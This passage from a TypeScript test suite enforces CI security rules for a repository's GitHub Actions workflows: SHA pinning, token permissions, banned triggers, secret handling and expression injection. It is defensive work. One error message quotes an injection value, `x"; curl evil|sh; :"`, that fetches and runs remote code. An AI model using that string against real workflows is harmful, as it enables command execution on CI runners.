	// single most permissive token GitHub offers, and the exact opposite of what
	// the rule exists to require. A matcher must match the invariant.
	test('no workflow grants itself blanket write', () => {
		const offenders: string[] = [];
		for (const { rel, src } of allWorkflows) {
			const block = src.match(/^permissions:([^\n]*)((?:\n[ \t]+[^\n]*)*)/m);
			const inline = (block?.[1] ?? '').trim();
			const nested = block?.[2] ?? '';
			if (/write-all/.test(inline) || /write-all/.test(nested)) {
				offenders.push(`${rel}: permissions grants write-all`);
				continue;
			}
			// `contents: write` is push rights. codeql.yml's security-events:write is
			// its actual output and is the one documented exception.
			if (/^\s*contents:\s*write\s*$/m.test(nested)) {
				offenders.push(`${rel}: contents: write — push rights for a job that reads`);
			}
		}
		expect(
			offenders,
			'A workflow token wider than the job needs is ambient push rights handed to every ' +
				`step, third-party actions included.\n  ${offenders.join('\n  ')}`,
		).toEqual([]);
	});

	// Rule 7c — the TRIGGERS the neighbouring rule's own comment names as the
	// threat it cannot reach (P2-21 / GATE-45). `pull_request_target` runs with a
	// WRITE token and the base repo's secrets while checking out the FORK's code;
	// `workflow_run` does the same after another workflow completes. Either one
	// turns "least privilege" into a formality.
	test('no workflow uses pull_request_target or workflow_run', () => {
		const offenders: string[] = [];
		for (const { rel, src } of allWorkflows) {
			for (const trigger of ['pull_request_target', 'workflow_run'] as const) {
				if (new RegExp(`^\\s{2,}${trigger}:`, 'm').test(src)) {
					offenders.push(`${rel}: ${trigger}`);
				}
			}
		}
		expect(
			offenders,
			"`pull_request_target` and `workflow_run` run with a WRITE token and this repo's " +
				'secrets while executing code from a fork. Neither is needed by any job here.\n  ' +
				offenders.join('\n  '),
		).toEqual([]);
	});

	// Rule 7d — EXPRESSION INJECTION (P2-24 / GATE-46). A `${{ … }}` expression is
	// substituted into the script TEXT before the shell ever sees it, so an
	// attacker-chosen input becomes commands. Secrets and inputs reach a `run:`
	// through `env:`, where the runner sets them as shell VARIABLES.
	//
	// WIDENED 2026-09-26, both ways the nightly workflow made visible:
	//   - the job/step OUTPUT namespaces (`needs.<job>.outputs.*`, `steps.<id>.outputs.*`)
	//     are substituted exactly like an input, and nightly.yml hands a JSON verdict
	//     carrying advisory titles from a third-party feed from one job to the next —
	//     text nobody in this repo wrote. It reaches the `report` script through `env:`.
	//   - the LIST-ITEM spelling `- run: …` was invisible: the matcher anchored `run:`
	//     at line start, so `      - run: echo ${{ inputs.x }}` passed. Controls below.
	test('no run: line interpolates an input, a secret or a job/step output', () => {
		const controls = [
			'      - run: echo ${{ inputs.x }}',
			'      - name: n\n        run: |\n          echo ${{ needs.check.outputs.summary }}',
			'        run: echo "${{ steps.audit.outputs.rc }}"',
			'        run: echo ${{ secrets.T }}',
		];
		for (const control of controls) {
			expect(
				runInterpolations(control),
				`matcher control: \`${control}\` must be flagged, or this rule is vacuous`,
			).toHaveLength(1);
		}
		// ...and the sanctioned shape — through env:, read as a shell variable — is not.
		expect(
			runInterpolations(
				'      - name: n\n        env:\n          RC: ${{ steps.audit.outputs.rc }}\n        run: exit "$RC"',
			),
		).toEqual([]);
		const offenders: string[] = [];
		for (const { rel, src } of allWorkflows) {
			for (const hit of runInterpolations(src)) offenders.push(`${rel}:${hit}`);
		}
		expect(
			offenders,
			'A `${{ … }}` expression inside `run:` is substituted into the SCRIPT TEXT: an input ' +
				'like `x"; curl evil|sh; :"` becomes commands. Pass it through `env:` and read the ' +
				`shell variable instead.\n  ${offenders.join('\n  ')}`,
		).toEqual([]);
	});

	// Rule 7e — an `environment:` GitHub can AUTO-CREATE has no protection rules,
	// so the manual approval CI.md relies on would exist only as an unexecuted UI
	// step (P2-24 / GATE-46).
	test('no job names its environment straight from an input', () => {
		const offenders: string[] = [];
		for (const { rel, src } of allWorkflows) {
			for (const [index, raw] of src.split('\n').entries()) {
				if (/^\s*environment:\s*\$\{\{\s*inputs\.\w+\s*\}\}\s*$/.test(raw)) {
					offenders.push(`${rel}:${index + 1}`);
				}
			}
		}
		expect(
			offenders,
			'`environment: ${{ inputs.x }}` AUTO-CREATES the named environment with NO protection ' +
				'rules when it does not exist yet. Map the input to an enumerated set of ' +
				`configured environments instead.\n  ${offenders.join('\n  ')}`,
		).toEqual([]);
	});

	// Rule 8b — THE PARKED TIER CANNOT ROT BEHIND THE LIVE ONE (P2-24 / CARRY-12).
	// Dependabot's github-actions ecosystem scans `.github/workflows` ONLY, so
	// `.github/workflows-selfhosted/` receives no update PRs at all: on activation
	// day its pins would be older than everything around them. Config cannot fix
	// that — GitHub does not scan the directory — so the gate is that any action
	// used in BOTH places carries the SAME SHA. Dependabot bumps the live copy;
	// this makes forgetting the parked copy a red build instead of a surprise.
	test('an action used in both tiers is pinned to the same SHA', () => {
		const pins = new Map<string, Map<string, string[]>>();
		for (const { rel, src } of allWorkflows) {
			for (const match of src.matchAll(/uses:\s*([\w./-]+)@([0-9a-f]{40})/g)) {
				const action = match[1] as string;
				const sha = match[2] as string;
				const byAction = pins.get(action) ?? new Map<string, string[]>();
				byAction.set(sha, [...(byAction.get(sha) ?? []), rel]);
				pins.set(action, byAction);
			}
		}
		// Anti-vacuity: the scan must actually see both tiers.
		expect(pins.size).toBeGreaterThan(3);
		expect(pins.has('actions/checkout')).toBe(true);

		const split: string[] = [];
		for (const [action, byAction] of pins) {
			if (byAction.size < 2) continue;
			const detail = [...byAction.entries()]
				.map(([sha, files]) => `${sha.slice(0, 12)} in ${files.join(', ')}`)
				.join(' | ');
			split.push(`${action}: ${detail}`);
		}
		expect(
			split,
			'The same action is pinned to different SHAs in different workflows. The parked ' +
				'self-hosted tier gets no Dependabot PRs, so a live-tier bump must be carried ' +
				`across by hand — that is what this catches.\n  ${split.join('\n  ')}`,
		).toEqual([]);
	});

	// Rule 11 — THE ISOLATED PACKAGES ARE ACTUALLY MEASURED (P2-23 / GATE-43).
	// hermetic.sh's own diagnostic greps `$dir/bunfig.toml` to print the threshold
	// that failed. For publication/site_builder that file did not exist: the
	// package's coverage was measured by NOTHING while its sibling held 0.8, and
	// the same script asserted eleven lines apart both that it had no bunfig and
	// that "Both daemons set coverageThreshold in their bunfig.toml". A comment
	// cannot be the thing that keeps two facts in step.
	test('every isolated daemon package MEASURES coverage, and the script says which enforce', () => {
		// Every package must at least MEASURE. Enforcement differs today and that
		// difference has to be written down, because the previous state was a
		// script asserting two contradictory things eleven lines apart while one
		// package's coverage was measured by nothing.
		// Anti-vacuity AT the corpus: site_builder, server_api/v2, host_agent. A
		// derivation that finds fewer has gone blind, and every loop below would
		// pass over nothing.
		expect(
			DAEMON_PACKAGES.length,
			'the daemon-package derivation (PACKAGES with a bunfig.toml) found too few packages',
		).toBeGreaterThanOrEqual(3);
		const enforcing: string[] = [];
		const reportingOnly: string[] = [];
		for (const pkg of DAEMON_PACKAGES) {
			const path = join(repoRoot, pkg, 'bunfig.toml');
			const bunfig = readFileSync(path, 'utf8');
			expect(bunfig, `${pkg} does not even measure coverage`).toMatch(/^\s*coverage\s*=\s*true/m);
			// A `coverageThreshold` in a COMMENT is not a threshold.
			const declares = /^\s*coverageThreshold\s*=/m.test(bunfig);
			(declares ? enforcing : reportingOnly).push(pkg);
			if (!declares) continue;
			const lines = Number(bunfig.match(/lines\s*=\s*([\d.]+)/)?.[1] ?? 0);
			const functions = Number(bunfig.match(/functions\s*=\s*([\d.]+)/)?.[1] ?? 0);
			// A floor of zero enforces nothing while looking like a gate.
			expect(lines, `${pkg} lines threshold is not a floor`).toBeGreaterThanOrEqual(0.8);
			expect(functions, `${pkg} functions threshold is not a floor`).toBeGreaterThanOrEqual(0.8);
			// An ignore pattern is an exemption from that floor: none may reach src/.
			const ignoreDecl = bunfig.match(
				/^\s*coveragePathIgnorePatterns\s*=\s*(\[[\s\S]*?\]|"[^"]*"|'[^']*')/m,
			);
			const ignored = ignoreDecl
				? [...ignoreDecl[1]!.matchAll(/["']([^"']*)["']/g)].map((m) => m[1]!)
				: [];
			for (const pattern of ignored) {
				const glob = new Bun.Glob(pattern);
				const hitsSrc =
					pattern.includes('src') ||
					['src/index.ts', 'src/a/b.ts', `${pkg}/src/index.ts`].some((p) => glob.match(p));
				expect(hitsSrc, `${pkg} coveragePathIgnorePatterns '${pattern}' exempts src/`).toBe(false);
			}
		}
		expect(enforcing, 'server_api/v2 must keep enforcing 0.8').toContain(
			'publication/server_api/v2',
		);
		// host_agent is born enforcing: its plan's global constraint states that the
		// site_builder reporting-only exemption is NOT inherited.
		expect(enforcing, 'host_agent must enforce coverageThreshold from day one').toContain(
			'publication/host_agent',
		);
		// site_builder reports but does not enforce YET (three route modules at
		// 0.00% functions, measured 2026-08-31). When that is fixed and a threshold
		// lands, this expectation flips — deliberately, in the same commit.
		expect(reportingOnly).toEqual(['publication/site_builder']);
	});

	test('hermetic.sh does not claim a package lacks the bunfig it greps', () => {
		// The exact contradiction this rule was written for: the script said
		// site_builder "has NO bunfig.toml at all" while its diagnostic grepped
		// that path and another comment said both daemons set a threshold.
		const script = readFileSync(join(repoRoot, 'scripts/ci/hermetic.sh'), 'utf8');
		expect(script).not.toMatch(/publication\/site_builder has NO bunfig\.toml/);
		// If it greps a package's bunfig, that bunfig must exist.
		if (script.includes('$dir/bunfig.toml')) {
			for (const pkg of DAEMON_PACKAGES) {
				expect(existsSync(join(repoRoot, pkg, 'bunfig.toml')), `${pkg}`).toBe(true);
			}
		}
	});

	// Rule 11b — EVERY LOCKED PACKAGE WE RUN HAS A DEPENDABOT ENTRY. Dependabot does
	// not discover packages: a directory left out of .github/dependabot.yml is a
	// lockfile nobody proposes bumps for, and "dependencies default to the latest
	// stable version" decays in silence. Held for the root and every DERIVED daemon
	// package, so the next daemon cannot land without its updater.
	test('the root and every isolated daemon package have their own Dependabot bun entry (rule 11b)', () => {
		const bunDirectories = (yaml: string): string[] =>
			[...yaml.matchAll(/^\s*- package-ecosystem: bun\s*\n\s+directory: "([^"]+)"/gm)].map(
				(m) => m[1] as string,
			);
		// Positive control: the reader sees a bun entry and ignores another ecosystem's.
		expect(
			bunDirectories(
				'  - package-ecosystem: bun\n    directory: "/a/b"\n  - package-ecosystem: pip\n    directory: "/docs"\n',
			),
		).toEqual(['/a/b']);
		const declared = bunDirectories(read('.github/dependabot.yml'));
		const missing = ['.', ...DAEMON_PACKAGES]
			.map((root) => (root === '.' ? '/' : `/${root}`))
			.filter((dir) => !declared.includes(dir));
		expect(
			missing,
			'.github/dependabot.yml: a locked package with no `bun` entry gets no update PRs — its lockfile only ever ages',
		).toEqual([]);
	});

	// Rule 12 — A TIER'S PROMISES ARE KEPT BY CODE, NOT BY COMMENTS
	// (P2-22 / GATE-06). hermetic.sh's tripwire list said
	// "parity_baseline_tripwire skips 5 legs behind DEDALO_PARITY_DRIFT" while
	// nothing in the repository ever set that key — so the legs RAN, on a runner
	// whose DB_PORT is deliberately closed, and every DB-backed parity gate died
	// at module scope for the ratchet to report as NEW PARITY REDS. A red nobody
	// can attribute is a gate that has stopped reporting. It was masked only
	// because lint was red and ran first.
	test('every env key hermetic.sh CLAIMS to set is actually exported', () => {
		const script = readFileSync(join(repoRoot, 'scripts/ci/hermetic.sh'), 'utf8');
		// Keys the script's own prose names as gating a skip or a mode.
		// DEDALO_VENDOR_DATED_CHECKS (2026-09-26): drops the calendar legs of
		// vendor_advisory_tripwire on the push gate — rule 17 holds its value and home.
		const promised = ['DEDALO_PARITY_DRIFT', 'DEDALO_VENDOR_DATED_CHECKS'];
		for (const key of promised) {
			expect(script, `hermetic.sh names ${key} but never sets it`).toMatch(
				new RegExp(`^\\s*(?:export\\s+)?${key}=`, 'm'),
			);
		}
	});

	test('a key that gates a skip is READ where the gate claims', () => {
		// Anti-vacuity for the rule above: setting a key nothing reads would satisfy
		// it while changing nothing.
		const gate = readFileSync(join(repoRoot, 'test/unit/parity_baseline_tripwire.test.ts'), 'utf8');
		expect(gate).toContain('DEDALO_PARITY_DRIFT');
		expect(gate, 'the skip must be driven by the key, not by a constant').toMatch(
			/process\.env\.DEDALO_PARITY_DRIFT/,
		);
		const vendor = readFileSync(
			join(repoRoot, 'test/unit/vendor_advisory_tripwire.test.ts'),
			'utf8',
		);
		expect(
			vendor,
			'hermetic.sh sets DEDALO_VENDOR_DATED_CHECKS=0 to drop the calendar legs; the gate must READ it, or the key changes nothing and the push gate stays date-dependent',
		).toMatch(/process\.env\.DEDALO_VENDOR_DATED_CHECKS/);
	});

	test('anti-vacuity: the permissions matchers fire on the shapes they forbid', () => {
		// Without these controls the two rules above are "this list is empty" over
		// a corpus that happens to be clean today.
		const blanket = 'permissions: write-all\n';
		expect(/write-all/.test(blanket)).toBe(true);
		const pushRights = 'permissions:\n  contents: write\n';
		expect(/^\s*contents:\s*write\s*$/m.test(pushRights)).toBe(true);
		expect(/^\s*contents:\s*write\s*$/m.test('permissions:\n  contents: read\n')).toBe(false);
		expect(/^\s{2,}pull_request_target:/m.test('on:\n  pull_request_target:\n')).toBe(true);
		expect(/^\s{2,}workflow_run:/m.test('on:\n  workflow_run:\n')).toBe(true);
		// ...and the ordinary trigger is not mistaken for the dangerous one.
		expect(/^\s{2,}pull_request_target:/m.test('on:\n  pull_request:\n')).toBe(false);
	});

	// Rule 8 — supply chain. A tag is mutable; a SHA is the thing we reviewed.
	test('every action is pinned to a commit SHA, never a moving tag', () => {
		const USES = /^\s*(?:-\s*)?uses:\s*(\S+)/gm;
		const offenders: string[] = [];
		for (const { rel, src } of allWorkflows) {
			for (const [, ref] of src.matchAll(USES)) {
				const value = ref as string;
				// Local (`./…`) and container (`docker://…`) references are not fetched from
				// a third-party repo at run time; everything else is `owner/repo@ref`.
				if (value.startsWith('./') || value.startsWith('docker://')) continue;
				const at = value.lastIndexOf('@');
				const pin = at === -1 ? '' : value.slice(at + 1);
				if (!/^[0-9a-f]{40}$/.test(pin)) offenders.push(`${rel}: uses: ${value}`);
			}
		}
		expect(
			offenders,
			'A GitHub action referenced by tag (`@v5`) runs whatever commit that tag points at TODAY — the action owner, or anyone who compromises that account, can repoint it. Pin the 40-hex SHA and keep the version in a trailing comment (`uses: actions/checkout@fbc6f39… # v5`); Dependabot updates both. .github/workflows-selfhosted/deploy.yml hands one of these an SSH deploy key:',
		).toEqual([]);
	});

	/**
	 * Rule 9 — every `github/codeql-action/*` step is pinned to ONE SHA.
	 *
	 * `init` and `analyze` are two paths inside one repo and MUST come from the same
	 * release: init writes the database that analyze reads, and a major-version split
	 * fails the run. Dependabot cannot see that — it models each action PATH as its own
	 * dependency, so on 2026-08-03 it opened a PR (#77) bumping `analyze` to v4.37.4
	 * while leaving `init` on the v3 SHA. The PR's own CodeQL job went red, which is the
	 * lucky case; the unlucky one is a green-looking half-upgrade nobody reads.
	 *
	 * Dependabot will propose the same split every time codeql-action releases, so this
	 * has to be mechanical: whoever takes that PR gets a red gate here until both lines
	 * move together.
	 */
	// Rule 11 (2026-08-25) — FORK SAFETY: the executed tier references NO secret.
	// dedalia-org/dedalo is PUBLIC. GitHub withholds secrets from fork-PR
	// `pull_request` runs, but that protection is one trigger edit away
	// (`pull_request_target` hands them back alongside the fork's code), and a
	// hosted test tier NEEDS no secret: its Postgres service password is a
	// throwaway the workflow hardcodes. `${{ secrets.X }}` stays legal in
	// .github/workflows-selfhosted/, which GitHub does not execute and where the
	// private mirror supplies the values.
	//
	// THE ONE CARVE-OUT (2026-10-09): the publish job of image-release.yml pushes the
	// official image to registries that cannot be reached with the run's own token
	// (Docker Hub has no OIDC push federation; the gitdedalo registry needs a robot
	// token). Legal only inside the job declaring `environment: image-release`, only
	// for names engineering/image_registries.json declares, and only while that
	// workflow has no pull_request / pull_request_target / workflow_run / schedule
	// trigger — each condition has a planted control below.
	//
	// Matched as the EXPRESSION, not a bare substring, so these files stay free to
	// DISCUSS the posture in their headers — the same courtesy rule 5 extends to
	// the phrase "self-hosted".
	test('no .github/workflows/ file references a secret, except the environment-bound release publish (rule 11)', () => {
		const declared = declaredSecretNames(loadImageRegistries());
		// Anti-vacuity: the allowlist is read from the list, and the carve-out is in use.
		expect(declared.length).toBeGreaterThanOrEqual(2);
		const release = read(join('.github', 'workflows', SECRET_WORKFLOW));
		expect(secretReferences(release).length).toBeGreaterThanOrEqual(2);
		const offenders = workflowFiles.flatMap((file) =>
			secretReferenceFaults(file, read(join('.github', 'workflows', file)), declared),
		);
		expect(
			offenders,
			'A secret reference in the EXECUTED tier of a public repo is a standing invitation: one trigger change and fork-PR code runs with it populated. A test tier needs none — hardcode the throwaway service password, and put anything genuinely secret in .github/workflows-selfhosted/ for the private mirror. The ONE exception is the environment-bound publish job of image-release.yml, for the names engineering/image_registries.json declares:',
		).toEqual([]);

		// Controls — each way out of the carve-out must be seen.
		const name = declared[0] as string;
		const planted = (from: string | RegExp, to: string): string[] => {
			const mutated = release.replace(from, to);
			expect(mutated === release, `control did not apply: ${String(from)}`).toBe(false);
			return secretReferenceFaults(SECRET_WORKFLOW, mutated, declared);
		};
		// (a) a declared secret in ANOTHER workflow
		expect(
			secretReferenceFaults(
				'ci.yml',
				`jobs:\n  x:\n    environment: ${SECRET_ENVIRONMENT}\n    env:\n      A: \${{ secrets.${name} }}\n`,
				declared,
			),
		).toHaveLength(1);
		// (b) in ANOTHER job of the release workflow (the plan job holds no environment)
		expect(
			planted(/^( {10}INPUT_CHANNEL: .*)$/m, `$1\n          LEAK: \${{ secrets.${name} }}`).join(),
		).toContain("job 'plan'");
		// (c) an UNDECLARED name in the right job
		expect(
			planted(/^( {10}RUN_ID: .*)$/m, '$1\n          OTHER: ${{ secrets.NPM_TOKEN }}').join(),
		).toContain("'NPM_TOKEN' is not declared");
		// (d) a forbidden trigger added to the release workflow
		expect(
			planted(/^ {2}workflow_dispatch:$/m, '  pull_request:\n  workflow_dispatch:').join(),
		).toContain('`pull_request`');
		expect(
			planted(
				/^ {2}workflow_dispatch:$/m,
				'  schedule:\n    - cron: "1 1 * * *"\n  workflow_dispatch:',
			).join(),
		).toContain('`schedule`');
		// (e) the environment removed from the publish job
		expect(planted(/^ {4}environment: image-release\n/m, '').join()).toContain("job 'publish'");
		// (f) a non-plain secret expression is still a reference
		expect(secretReferences("a: ${{ secrets[format('{0}', x)] }}")).toEqual(['?']);
	});

	// Rule 12 (2026-08-25) — container images are DIGEST-pinned. Rule 8 above
	// inspects only `uses:` lines, so a `services:` (or `container:`) image was
	// invisible to it — and that is rule 8's own threat with MORE reach: the
	// container shares the runner with the checkout, and a tag is repointable by
	// its publisher at any time. security.yml:42-44 already digest-pins the
	// gitleaks image by hand for exactly this stated reason; this makes the
	// convention a gate. Binds both tiers, like rule 8.
	//
	// The INLINE `container: <ref>` spelling (2026-09-26) is the same image under the
	// other key GitHub accepts, and the tiers are moving into the CI image: a
	// `container: ghcr.io/dedalia-org/dedalo-ci:latest` would have passed a scan that
	// only read `image:` lines. The mapping form (`container:` + `image:` below it) is
	// already covered by the image: scan.
	test('every workflow image: (and inline container:) is pinned by digest, never a tag', () => {
		const imageRefs = (src: string): string[] => [
			...[...src.matchAll(/^\s*image:\s*(\S+)/gm)].map((m) => m[1] as string),
			...[...src.matchAll(/^\s*container:[ \t]*([^\s#]+)/gm)].map((m) => m[1] as string),
		];
		// Controls: the inline tag is seen, the mapping form defers to its image: line.
		expect(imageRefs('    container: ghcr.io/x/y:latest\n')).toEqual(['ghcr.io/x/y:latest']);
		expect(imageRefs(`    container:\n      image: a@sha256:${'0'.repeat(64)}\n`)).toHaveLength(1);
		const offenders: string[] = [];
		for (const { rel, src } of allWorkflows) {
			for (const image of imageRefs(src)) {
				if (!/@sha256:[0-9a-f]{64}$/.test(image)) offenders.push(`${rel}: image: ${image}`);
			}
		}
		expect(
			offenders,
			'A workflow image referenced by tag runs whatever its publisher points that tag at TODAY, on the same runner as the checkout. Pin the digest and keep the human-readable version in a trailing comment — the security.yml gitleaks precedent:',
		).toEqual([]);
	});

	// Rule 12b (2026-09-26) — ONE pgvector digest across the hosted tier and the
	// local gate. .github/dependabot.yml's `docker-compose /ci` entry bumps ONLY
	// ci/compose.yml (Dependabot does not update workflow `services:`/`container:`
	// images, dependabot-core#5819), so without this gate its PR would silently make
	// `ci:local --docker` judge against a different Postgres than db.yml's jobs. With
	// it, that PR is red until the workflow pins move in the same PR. Measured on the
	// digest (the bytes), never the tag spelling; binds both workflow tiers.
	test('every pgvector image in the workflows equals ci/compose.yml’s digest (one Postgres, two tiers)', () => {
		const PGVECTOR =
			/^\s*(?:image|container):\s*pgvector\/pgvector[^\s@#]*@sha256:([0-9a-f]{64})/gm;
		const digestsIn = (src: string) => [...src.matchAll(PGVECTOR)].map((m) => m[1] as string);
		// Controls: both spellings (compose's `name:tag@digest`, the workflows' bare
		// `name@digest`) yield the digest; an unrelated image yields nothing.
		const d = 'a'.repeat(64);
		expect(digestsIn(`    image: pgvector/pgvector:pg18@sha256:${d}\n`)).toEqual([d]);
		expect(digestsIn(`    image: pgvector/pgvector@sha256:${d} # pg18\n`)).toEqual([d]);
		expect(digestsIn(`    image: postgres@sha256:${d}\n`)).toEqual([]);

		const composeDigests = digestsIn(read('ci/compose.yml'));
		// Guards the guard: the compose service renamed or re-spelled would leave
		// nothing to compare against and every workflow pin would "match" vacuously.
		expect(
			composeDigests,
			'ci/compose.yml must pin exactly one pgvector image by digest',
		).toHaveLength(1);
		const [composeDigest] = composeDigests;

		const workflowPins = allWorkflows.flatMap(({ rel, src }) =>
			digestsIn(src).map((digest) => ({ rel, digest })),
		);
		// Guards the guard: db.yml's `db` and `instance` services are the copies this
		// rule exists for — zero found means the scan went blind, not that all agree.
		expect(
			workflowPins.length,
			'no pgvector image found under the workflows — the scan went blind (or the hosted jobs now start pgvector from ci/compose.yml: then retire this rule with its reason)',
		).toBeGreaterThan(0);
		const offenders = workflowPins
			.filter(({ digest }) => digest !== composeDigest)
			.map(
				({ rel, digest }) => `${rel}: pgvector@sha256:${digest} ≠ ci/compose.yml ${composeDigest}`,
			);
		expect(
			offenders,
			'The hosted tier and the local gate must run the SAME Postgres bytes. A Dependabot bump of ci/compose.yml moves only that copy — move every workflow pin in the same PR:',
		).toEqual([]);
	});

	test('every codeql-action step is pinned to the same SHA (init and analyze cannot split)', () => {
		const CODEQL_USES = /uses:\s*github\/codeql-action\/[a-z-]+@([0-9a-f]{40})/g;
		const bySha = new Map<string, string[]>();
		for (const { rel, src } of allWorkflows) {
			for (const [line, sha] of [...src.matchAll(CODEQL_USES)].map(
				(m) => [m[0] as string, m[1] as string] as const,
			)) {
				bySha.set(sha, [...(bySha.get(sha) ?? []), `${rel}: ${line}`]);
			}
		}
		// Guards the guard: rename the workflow or the action and this would pass over an
		// empty map, proving nothing — the same zero-length trap the ledger gates carry.
		expect(
			bySha.size,
			'No SHA-pinned github/codeql-action step found in any workflow. Either CodeQL was removed (then delete this rule deliberately) or the pin grammar changed and this gate is now blind.',
		).toBeGreaterThan(0);
		expect(
			[...bySha.entries()].map(([sha, where]) => `${sha}: ${where.join(' | ')}`),
			'The codeql-action steps are pinned to DIFFERENT commits. `init` builds the database `analyze` consumes; across majors that run fails. Bump every codeql-action line to one SHA in one change — Dependabot proposes them separately and cannot know they are one dependency:',
		).toHaveLength(1);
	});

	// The secret scanner's config is the one place where "make the alert go away" and
	// "fix the leak" look identical in a diff. Keep the default ruleset load-bearing.
	test('the gitleaks config extends the default ruleset instead of replacing it', () => {
		const src = read('.gitleaks.toml');
		expect(
			/^\s*useDefault\s*=\s*true\s*$/m.test(src),
			'.gitleaks.toml must set `[extend] useDefault = true`. Without it, our two allowlists REPLACE ~170 upstream provider rules and the scan reports a clean repo because it stopped looking — and GitLab loads this same file wholesale through .gitlab/secret-detection-ruleset.toml, so the blindness would be on both platforms at once.',
		).toBe(true);
	});

	// Rule 1b (2026-09-26) — ONE CI IMAGE on every host (scripts/lib/ci_image.ts). Until
	// this date only ci:local ran the image: GitHub ran bare ubuntu-latest + setup-bun +
	// apt at run time, GitLab bare oven/bun as root (no git; root defeats the uid gates),
	// so a local green predicted neither and CI stayed the debugger.
	//
	// WHAT IS MEASURED, and why not "lock == checkout". The outcome that matters is that
	// a tier runs in an image built from THIS checkout's definition — so, IN the image
	// (DEDALO_CI_IMAGE=1), /etc/dedalo-ci-image must equal the checkout's fingerprint.
	// That is green where ci:local builds a not-yet-published definition, and red on a
	// host still running the locked older build: the "publish, then `bun run
	// ci:image:pin`" signal. Asserting lock == checkout here instead DEADLOCKED (review
	// 2026-09-26): a Dockerfile/.bun-version change was red in hermetic, so the pre-push
	// gate refused the push that ci-image.yml needs in order to publish it. The lock's
	// freshness is nightly's `ci:image:pin --check` (tier_wiring leg D credits it).
	// Rule 1c (2026-10-02) — the CI image carries every package the product image does.
	test('the CI image apt-installs every package the product image does (measured, minus reasoned debt)', () => {
		const product = aptInstalledPackages(read('Dockerfile'));
		const ci = aptInstalledPackages(read('ci/Dockerfile'));
		// Floors: a parser that read nothing would make the superset vacuous.
		expect(product.size, 'read no package from the product Dockerfile').toBeGreaterThan(10);
		expect(ci.size, 'read no package from ci/Dockerfile').toBeGreaterThan(10);
		for (const anchor of [
			'imagemagick',
			'libheif-plugin-aomenc',
			'ffmpeg',
			'ghostscript',
			'ocrmypdf',
		]) {
			expect(product.has(anchor), `product Dockerfile: ${anchor} not read`).toBe(true);
			// The CI side's reader sees the same names (a ci/Dockerfile reader that missed
			// one would report it "missing" and push a needless debt row).
			expect(ci.has(anchor), `ci/Dockerfile: ${anchor} not read`).toBe(true);
		}
		const missing = [...product].filter((p) => !ci.has(p) && !(p in CI_IMAGE_MISSING_PACKAGES));
		expect(
			missing,
			'the product image installs these and the CI image does not — a gate on the hosts measures a toolchain that does not ship. Add them to ci/Dockerfile through the publish flow (engineering/CI.md "The pin"):',
		).toEqual([]);
		// Shrink-only, and never stale: an excused package must really be missing, and
		// must really be one the product image installs.
		for (const [pkg, reason] of Object.entries(CI_IMAGE_MISSING_PACKAGES)) {
			expect(
				product.has(pkg),
				`${pkg}: excused but the product image no longer installs it — delete the row`,
			).toBe(true);
			expect(
				ci.has(pkg),
				`${pkg}: excused but ci/Dockerfile installs it now — delete the row`,
			).toBe(false);
			expect(reason.length, `${pkg}: an exemption carries a reason`).toBeGreaterThan(40);
		}
	});

	test('POSITIVE CONTROL: the apt reader sees both Dockerfile spellings and ignores comments', () => {
		const planted = [
			'# apt-get install -y commented-out',
			'RUN apt-get update \\',
			' && apt-get install -y --no-install-recommends \\',
			'      ffmpeg imagemagick \\',
			'      git \\',
			' && rm -rf /var/lib/apt/lists/*',
			'RUN set -eux; \\',
			'    apt-get install -y --no-install-recommends \\',
			'      poppler-utils ghostscript; \\',
			'    rm -rf /var/lib/apt/lists/*',
		].join('\n');
		expect([...aptInstalledPackages(planted)].sort()).toEqual([
			'ffmpeg',
			'ghostscript',
			'git',
			'imagemagick',
			'poppler-utils',
		]);
	});

	test('every tier on every host runs the ONE locked CI image, as uid 1001, built from THIS definition', () => {
		const lock = readCiImageLock(repoRoot);
		// The lock names the publishing repository — or, during the repository move ONLY,
		// the named legacy one (scripts/lib/ci_image.ts CI_IMAGE_LEGACY). The legacy name
		// lives exactly as long as a pin uses it: once `bun run ci:image:pin` has moved
		// the lock to CI_IMAGE_NAME this goes RED until CI_IMAGE_LEGACY is set to null,
		// so the transition cannot outlive its reason (engineering/CI.md "Moving the CI
		// image repository").
		if (CI_IMAGE_LEGACY === null) {
			expect(lock.image, 'ci/image.json names another repository').toBe(CI_IMAGE_NAME);
		} else {
			expect(CI_IMAGE_LEGACY.reason.length, 'CI_IMAGE_LEGACY carries a reason').toBeGreaterThan(40);
			expect(
				lock.image,
				`ci/image.json no longer pins the legacy ${CI_IMAGE_LEGACY.name}: the repository move is done — set CI_IMAGE_LEGACY = null in scripts/lib/ci_image.ts (then retire the old package)`,
			).toBe(CI_IMAGE_LEGACY.name);
		}

		// (a) IN the image: the image IS this checkout's definition.
		if (process.env.DEDALO_CI_IMAGE === '1') {
			expect(
				readFileSync('/etc/dedalo-ci-image', 'utf8').trim(),
				'this tier runs in a CI image built from ANOTHER ci/Dockerfile/.bun-version. Once ci-image.yml has published this definition: bun run ci:image:pin (engineering/CI.md "The pin")',
			).toBe(ciImageFingerprint(repoRoot));
		}

		// (b) Every digest literal on either host is the lock's, and the updater's file
		//     list is exactly the files holding one (else ci:image:pin leaves one behind).
		const hosts = [...allWorkflows, { rel: '.gitlab-ci.yml', src: read('.gitlab-ci.yml') }];
		const holders: string[] = [];
		for (const { rel, src } of hosts) {
			const refs = [...src.matchAll(CI_IMAGE_REF)];
			// A dedalo-ci digest under a name the regex does not accept would be invisible
			// to the updater and to every leg below — count them independently.
			const anyName = [...src.matchAll(/dedalo-ci@sha256:/g)].length;
			expect(
				refs.length,
				`${rel}: a dedalo-ci@sha256 literal under a repository other than ${CI_IMAGE_NAME}${CI_IMAGE_LEGACY ? ` / ${CI_IMAGE_LEGACY.name}` : ''}`,
			).toBe(anyName);
			if (refs.length === 0) continue;
			holders.push(rel);
			for (const m of refs) {
				expect(`${m[1]}@${m[2]}`, `${rel}: a dedalo-ci pin that is not ci/image.json's`).toBe(
					lockedImageRef(lock),
				);
			}
		}
		expect(
			[...holders].sort(),
			'CI_IMAGE_REFERENCES (scripts/lib/ci_image.ts) must list exactly the files holding a dedalo-ci digest',
		).toEqual([...CI_IMAGE_REFERENCES].sort());

		// (c) Every job that runs a tier root runs IN the image as uid 1001 — per job, on
		//     both hosts. Jobs are found line by line (a trailing comment, a `run: |`
		//     block, `./scripts/…` all count), and EVERY tier-root mention on a code line
		//     must fall inside a found job, so the finder cannot go blind on one job.
		const TIER_ROOT = /(?:^|[\s"'])(?:\.\/)?scripts\/ci\/(?:hermetic|db_tier|instance_tier)\.sh\b/;
		const jobsOf = (src: string, indent: number) => {
